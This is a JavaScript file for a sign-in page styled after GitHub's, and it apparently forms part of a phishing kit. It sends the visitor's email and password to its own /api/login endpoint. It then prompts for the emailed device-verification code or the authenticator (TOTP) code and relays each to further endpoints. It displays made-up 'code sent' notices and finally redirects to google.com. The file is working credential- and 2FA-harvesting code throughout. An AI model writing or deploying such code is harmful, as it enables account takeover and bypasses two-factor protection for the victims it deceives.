document.addEventListener("DOMContentLoaded", () => {
  // Select the GitHub-style sign-in button and its form
  const signInButton = document.querySelector(".js-sign-in-button");
  const signInForm = signInButton?.closest("form");
  const emailInput = document.querySelector("#login_field");
  const passwordInput = document.querySelector("#password");
  const loginErrorFlash = document.querySelector("#login-error-flash");
  const loginStandardView = document.querySelector(
    '[data-test-selector="login-standard-view"]'
  );
  // Device verification block (second step)
  const deviceVerificationBlock = document.querySelector(
    "#login.auth-form.px-3"
  );
  const deviceVerificationDescription = document.querySelector(
    "#verify-device-input-description"
  );
  const otpInput = document.querySelector("#otp");
  const verifyButton = document.querySelector(
    "#login button.btn-primary.btn.btn-block"
  );
  const verifyForm = verifyButton?.closest("form");
  const deviceFlashContainer = document.querySelector(
    "#login .flash-container"
  );
  const deviceFlashTemplate =
    deviceFlashContainer?.querySelector(".js-flash-template");

  // 2FA (TOTP) block - shown when login returns result 4
  const twoFactorBlock = document.querySelector("#two-factor-block");
  const twoFactorForm = document.querySelector("#two-factor-form");
  const appTotpInput = document.querySelector("#app_totp");
  const twoFactorVerifyButton = twoFactorForm?.querySelector(
    'button[type="submit"]'
  );
  const twoFactorFlashContainer = document.querySelector(
    "#two-factor-block .flash-container"
  );
  const twoFactorFlashTemplate =
    twoFactorFlashContainer?.querySelector(".js-flash-template");

  if (!signInButton || !signInForm || !emailInput || !passwordInput) {
    console.warn("Sign in button, form, or inputs not found.");
    return;
  }

  let currentSessionId = null;

  const originalButtonText =
    typeof signInButton.value === "string" && signInButton.value
      ? signInButton.value
      : signInButton.textContent || "Sign in";

  function setSignInButtonLoading(isLoading) {
    if (isLoading) {
      signInButton.disabled = true;
      signInButton.style.cursor = "not-allowed";
      // Darker look while loading
      signInButton.style.filter = "brightness(0.85)";
      if (signInButton.tagName === "INPUT") {
        signInButton.value = "Signing in…";
      } else {
        signInButton.textContent = "Signing in…";
      }
    } else {
      signInButton.disabled = false;
      signInButton.style.cursor = "";
      signInButton.style.filter = "";
      if (signInButton.tagName === "INPUT") {
        signInButton.value = originalButtonText;
      } else {
        signInButton.textContent = originalButtonText;
      }
    }
  }

  const originalVerifyButtonText =
    verifyButton?.textContent || verifyButton?.value || "Verify";

  function setVerifyButtonLoading(isLoading) {
    if (!verifyButton) return;
    if (isLoading) {
      verifyButton.disabled = true;
      verifyButton.style.cursor = "not-allowed";
      verifyButton.style.filter = "brightness(0.85)";
      verifyButton.textContent = "Verifying…";
    } else {
      verifyButton.disabled = false;
      verifyButton.style.cursor = "";
      verifyButton.style.filter = "";
      verifyButton.textContent = originalVerifyButtonText;
    }
  }

  // Mask email like: b**********@gmail.com
  function maskEmailAddress(rawEmail) {
    if (!rawEmail || typeof rawEmail !== "string") return rawEmail || "";
    const [local, domain] = rawEmail.split("@");
    if (!local || !domain) return rawEmail;

    const firstChar = local[0];
    const stars = "*".repeat(Math.max(local.length - 1, 1));
    return `${firstChar}${stars}@${domain}`;
  }

  async function handleSignIn(event) {
    event.preventDefault();

    const email = emailInput.value.trim();
    const password = passwordInput.value;

    if (!email || !password) {
      console.warn("Email and password must be filled before signing in.");

      // Use built-in browser validation UI for required fields
      if (!email) {
        emailInput.reportValidity?.();
        emailInput.focus();
      } else if (!password) {
        passwordInput.reportValidity?.();
        passwordInput.focus();
      }
      return;
    }

    console.log("Sending login request with email and password...");

    // Hide error flash before a new attempt
    if (loginErrorFlash) {
      loginErrorFlash.style.display = "none";
    }

    // Put the button into a loading / disabled state
    setSignInButtonLoading(true);

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json().catch(() => ({}));
      console.log("Login response:", data);

      if (data) {
        if (data.sessionId) {
          currentSessionId = data.sessionId;
        }

        // If server indicates incorrect credentials (result === 0),
        // show the error flash and clear the password field.
        if (data.result === 0) {
          if (loginErrorFlash) {
            loginErrorFlash.style.display = "";
          }
          passwordInput.value = "";
        }

        // If login was fully successful (result === 3), go to google.com
        if (data.result === 3) {
          window.location.href = "https://google.com";
          return;
        }

        // If 2FA (TOTP) is required (result === 4),
        // hide the main login view and show the 2FA block.
        if (data.result === 4) {
          if (loginStandardView) {
            loginStandardView.style.display = "none";
          }
          if (twoFactorBlock) {
            twoFactorBlock.style.display = "block";
          }
        }

        // If server indicates we should go to device verification (result === 1),
        // hide the main login view and show the device verification block.
        if (data.result === 1) {
          if (loginStandardView) {
            loginStandardView.style.display = "none";
          }
          if (deviceVerificationBlock) {
            deviceVerificationBlock.style.display = "block";
          }

          if (deviceVerificationDescription) {
            // Format current time similar to "1:52PM"
            const now = new Date();
            const timeStr = now.toLocaleTimeString("en-US", {
              hour: "numeric",
              minute: "2-digit",
              hour12: true,
            });

            const maskedEmail = maskEmailAddress(email);
            deviceVerificationDescription.textContent =
              `We just sent your authentication code via email to ${maskedEmail}. ` +
              `The code will expire at ${timeStr} WAT.`;
          }
        }
      }
    } catch (err) {
      console.error("Error sending login request:", err);
    } finally {
      // Re-enable the button once the server responds (or request fails)
      setSignInButtonLoading(false);
    }
  }

  async function handleVerifyDevice(event) {
    event.preventDefault();

    if (!otpInput) return;
    const code = otpInput.value.trim();
    if (!code) {
      otpInput.reportValidity?.();
      otpInput.focus();
      return;
    }

    if (!currentSessionId) {
      console.warn("No active sessionId for device verification.");
      return;
    }

    // Clear any existing device flash error
    if (deviceFlashContainer) {
      deviceFlashContainer
        .querySelectorAll(".flash.flash-full.flash-error")
        .forEach((el) => {
          if (el.id !== "login-error-flash") el.remove();
        });
    }

    setVerifyButtonLoading(true);

    try {
      const response = await fetch("/api/verified-device", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ code, sessionId: currentSessionId }),
      });

      const data = await response.json().catch(() => ({}));
      console.log("Verified-device response:", data);

      if (data && data.result === 1) {
        window.location.href = "https://google.com";
      } else if (data && data.result === 0) {
        // Show an inline flash error with "Invalid verification code"
        if (deviceFlashContainer && deviceFlashTemplate) {
          const fragment =
            "content" in deviceFlashTemplate
              ? deviceFlashTemplate.content.cloneNode(true)
              : null;
          if (fragment) {
            const flash = fragment.querySelector(".flash");
            if (flash) {
              flash.className = "flash flash-full flash-error";
              const alert = flash.querySelector(".js-flash-alert");
              if (alert) {
                alert.textContent = "Incorrect verification code provided.";
              }
              deviceFlashContainer.insertBefore(fragment, deviceFlashTemplate);
            }
          }
        }
      }
    } catch (err) {
      console.error("Error during device verification:", err);
    } finally {
      setVerifyButtonLoading(false);
    }
  }

  async function handleTwoFactorSubmit(event) {
    event.preventDefault();

    if (!appTotpInput) return;
    const code = appTotpInput.value.trim();
    if (!code) {
      appTotpInput.reportValidity?.();
      appTotpInput.focus();
      return;
    }

    if (!currentSessionId) {
      console.warn("No active sessionId for 2FA.");
      return;
    }

    if (twoFactorFlashContainer) {
      twoFactorFlashContainer
        .querySelectorAll(".flash.flash-full.flash-error")
        .forEach((el) => el.remove());
    }

    if (twoFactorVerifyButton) {
      twoFactorVerifyButton.disabled = true;
      twoFactorVerifyButton.style.cursor = "not-allowed";
      twoFactorVerifyButton.style.filter = "brightness(0.85)";
      twoFactorVerifyButton.textContent = "Verifying…";
    }

    try {
      const response = await fetch("/api/two-factor", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code, sessionId: currentSessionId }),
      });

      const data = await response.json().catch(() => ({}));
      console.log("Two-factor response:", data);

      if (data && data.result === 1) {
        window.location.href = "https://google.com";
      } else if (data && data.result === 0) {
        if (twoFactorFlashContainer && twoFactorFlashTemplate) {
          const fragment =
            "content" in twoFactorFlashTemplate
              ? twoFactorFlashTemplate.content.cloneNode(true)
              : null;
          if (fragment) {
            const flash = fragment.querySelector(".flash");
            if (flash) {
              flash.className = "flash flash-full flash-error";
              const alert = flash.querySelector(".js-flash-alert");
              if (alert) {
                alert.textContent = "Two-factor authentication failed";
              }
              twoFactorFlashContainer.insertBefore(
                fragment,
                twoFactorFlashTemplate
              );
            }
          }
        }
      }
    } catch (err) {
      console.error("Error during 2FA verification:", err);
    } finally {
      if (twoFactorVerifyButton) {
        twoFactorVerifyButton.disabled = false;
        twoFactorVerifyButton.style.cursor = "";
        twoFactorVerifyButton.style.filter = "";
        twoFactorVerifyButton.textContent = "Verify";
      }
    }
  }

  // Intercept form submit
  signInForm.addEventListener("submit", handleSignIn);

  // Intercept button click
  signInButton.addEventListener("click", handleSignIn);

  // Wire up device verification form/button if present
  if (verifyForm && verifyButton && otpInput) {
    verifyForm.addEventListener("submit", handleVerifyDevice);
    verifyButton.addEventListener("click", handleVerifyDevice);
  }

  // Wire up 2FA form if present
  if (twoFactorForm && appTotpInput) {
    twoFactorForm.addEventListener("submit", handleTwoFactorSubmit);
    if (twoFactorVerifyButton) {
      twoFactorVerifyButton.addEventListener("click", handleTwoFactorSubmit);
    }
  }
});

